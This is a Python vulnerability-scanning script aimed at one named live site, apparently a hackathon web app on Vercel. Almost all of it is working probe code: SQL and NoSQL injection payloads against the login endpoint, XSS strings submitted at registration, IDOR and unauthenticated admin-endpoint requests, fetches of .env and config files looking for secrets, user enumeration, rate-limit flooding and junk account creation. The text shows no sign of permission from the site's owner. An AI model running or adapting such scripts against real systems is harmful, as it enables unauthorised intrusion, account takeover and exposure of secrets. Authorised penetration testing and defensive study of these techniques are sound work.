import requests
import json
import time

BASE_URL = "https://smartkopargaonhackathon.vercel.app"

class SecurityTester:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
            "Accept": "application/json",
            "Content-Type": "application/json",
        })
        self.vulnerabilities = []
        self.findings = []
    
    def log_vuln(self, severity, category, description, evidence=""):
        self.vulnerabilities.append({
            "severity": severity,
            "category": category,
            "description": description,
            "evidence": evidence
        })
        print(f"[{severity}] {category}: {description}")
    
    def log_finding(self, category, description):
        self.findings.append({"category": category, "description": description})
        print(f"[INFO] {category}: {description}")
    
    def test_authentication(self):
        print("\n" + "="*80)
        print("[TEST 1] AUTHENTICATION & SESSION MANAGEMENT")
        print("="*80)
        
        # Test 1.1: SQL Injection in login
        print("\n[1.1] Testing SQL Injection in login...")
        sqli_payloads = [
            {"email": "admin@test.com", "password": "' OR '1'='1"},
            {"email": "' OR 1=1--", "password": "password"},
            {"email": "admin'--", "password": "anything"},
        ]
        
        for payload in sqli_payloads:
            try:
                r = self.session.post(f"{BASE_URL}/api/auth/login", json=payload, timeout=5)
                if r.status_code == 200 or "token" in r.text.lower():
                    self.log_vuln("CRITICAL", "SQL Injection", 
                                f"Login vulnerable to SQLi: {payload}", r.text[:200])
                    break
            except:
                pass
        else:
            self.log_finding("SQL Injection", "No obvious SQLi in login")
        
        # Test 1.2: NoSQL Injection
        print("\n[1.2] Testing NoSQL Injection...")
        nosql_payloads = [
            {"email": {"$ne": None}, "password": {"$ne": None}},
            {"email": {"$gt": ""}, "password": {"$gt": ""}},
        ]
        
        for payload in nosql_payloads:
            try:
                r = self.session.post(f"{BASE_URL}/api/auth/login", json=payload, timeout=5)
                if r.status_code == 200 or "token" in r.text.lower():
                    self.log_vuln("CRITICAL", "NoSQL Injection",
                                f"Login vulnerable to NoSQL injection", r.text[:200])
                    break
            except:
                pass
        
        # Test 1.3: Weak password policy
        print("\n[1.3] Testing weak password registration...")
        weak_passwords = ["123", "password", "test"]
        for pwd in weak_passwords:
            try:
                payload = {
                    "email": f"test{time.time()}@test.com",
                    "password": pwd,
                    "name": "Test User"
                }
                r = self.session.post(f"{BASE_URL}/api/auth/register", json=payload, timeout=5)
                if r.status_code in [200, 201]:
                    self.log_vuln("MEDIUM", "Weak Password Policy",
                                f"Weak password accepted: {pwd}")
                    break
            except:
                pass
    
    def test_authorization(self):
        print("\n" + "="*80)
        print("[TEST 2] AUTHORIZATION & ACCESS CONTROL")
        print("="*80)
        
        # Test 2.1: IDOR - Access other users data
        print("\n[2.1] Testing IDOR vulnerabilities...")
        user_ids = [1, 2, 100, 999, "admin"]
        for uid in user_ids:
            try:
                r = self.session.get(f"{BASE_URL}/api/users/{uid}", timeout=5)
                if r.status_code == 200:
                    self.log_vuln("HIGH", "IDOR", 
                                f"Can access user {uid} without auth", r.text[:200])
            except:
                pass
        
        # Test 2.2: Admin endpoints without auth
        print("\n[2.2] Testing admin endpoints without authentication...")
        admin_eps = [
            "/api/admin/users",
            "/api/admin/stats",
            "/api/admin/teams",
            "/api/admin/submissions",
        ]
        
        for ep in admin_eps:
            try:
                r = self.session.get(f"{BASE_URL}{ep}", timeout=5)
                if r.status_code == 200:
                    self.log_vuln("CRITICAL", "Broken Access Control",
                                f"Admin endpoint accessible without auth: {ep}", r.text[:200])
            except:
                pass
    
    def test_injection(self):
        print("\n" + "="*80)
        print("[TEST 3] INJECTION VULNERABILITIES")
        print("="*80)
        
        # Test 3.1: XSS
        print("\n[3.1] Testing XSS...")
        xss_payloads = [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>",
            "javascript:alert(1)",
        ]
        
        # Test in registration
        for payload in xss_payloads:
            try:
                data = {
                    "email": f"test{time.time()}@test.com",
                    "password": "Test123!",
                    "name": payload
                }
                r = self.session.post(f"{BASE_URL}/api/auth/register", json=data, timeout=5)
                if r.status_code in [200, 201] and payload in r.text:
                    self.log_vuln("HIGH", "XSS", 
                                f"XSS payload reflected: {payload}")
                    break
            except:
                pass
    
    def test_sensitive_data(self):
        print("\n" + "="*80)
        print("[TEST 4] SENSITIVE DATA EXPOSURE")
        print("="*80)
        
        # Test 4.1: Check for exposed config
        print("\n[4.1] Testing for exposed configuration...")
        config_eps = [
            "/api/config",
            "/api/event-config",
            "/api/admin/event-config",
            "/.env",
            "/config.json",
        ]
        
        for ep in config_eps:
            try:
                r = self.session.get(f"{BASE_URL}{ep}", timeout=5)
                if r.status_code == 200:
                    if any(x in r.text.lower() for x in ["apikey", "secret", "password", "token"]):
                        self.log_vuln("CRITICAL", "Sensitive Data Exposure",
                                    f"Sensitive config exposed at {ep}", r.text[:300])
                    else:
                        self.log_finding("Config Endpoint", f"{ep} accessible but no obvious secrets")
            except:
                pass
        
        # Test 4.2: Check user enumeration
        print("\n[4.2] Testing user enumeration...")
        try:
            r1 = self.session.post(f"{BASE_URL}/api/auth/login",
                                  json={"email": "nonexistent@test.com", "password": "test"}, timeout=5)
            r2 = self.session.post(f"{BASE_URL}/api/auth/login",
                                  json={"email": "admin@test.com", "password": "wrongpass"}, timeout=5)
            
            if r1.text != r2.text or r1.status_code != r2.status_code:
                self.log_vuln("LOW", "User Enumeration",
                            "Different responses for valid/invalid users")
        except:
            pass
    
    def test_business_logic(self):
        print("\n" + "="*80)
        print("[TEST 5] BUSINESS LOGIC FLAWS")
        print("="*80)
        
        # Test 5.1: Rate limiting
        print("\n[5.1] Testing rate limiting...")
        count = 0
        for i in range(20):
            try:
                r = self.session.post(f"{BASE_URL}/api/auth/login",
                                    json={"email": "test@test.com", "password": "test"}, timeout=2)
                if r.status_code != 429:
                    count += 1
            except:
                pass
        
        if count >= 15:
            self.log_vuln("MEDIUM", "Missing Rate Limiting",
                        f"No rate limiting detected - {count}/20 requests succeeded")
    
    def generate_report(self):
        print("\n" + "="*80)
        print("SECURITY ASSESSMENT REPORT")
        print("="*80)
        
        print(f"\nTotal Vulnerabilities Found: {len(self.vulnerabilities)}")
        print(f"Total Findings: {len(self.findings)}")
        
        if self.vulnerabilities:
            print("\nVULNERABILITIES:")
            for v in self.vulnerabilities:
                print(f"\n[{v['severity']}] {v['category']}")
                print(f"  Description: {v['description']}")
                if v['evidence']:
                    print(f"  Evidence: {v['evidence'][:150]}...")
        
        # Save to file
        report = {
            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
            "target": BASE_URL,
            "vulnerabilities": self.vulnerabilities,
            "findings": self.findings
        }
        
        with open("sk_security_report.json", "w") as f:
            json.dump(report, f, indent=2)
        print("\n[+] Full report saved to sk_security_report.json")

# Run tests
tester = SecurityTester()
tester.test_authentication()
tester.test_authorization()
tester.test_injection()
tester.test_sensitive_data()
tester.test_business_logic()
tester.generate_report()
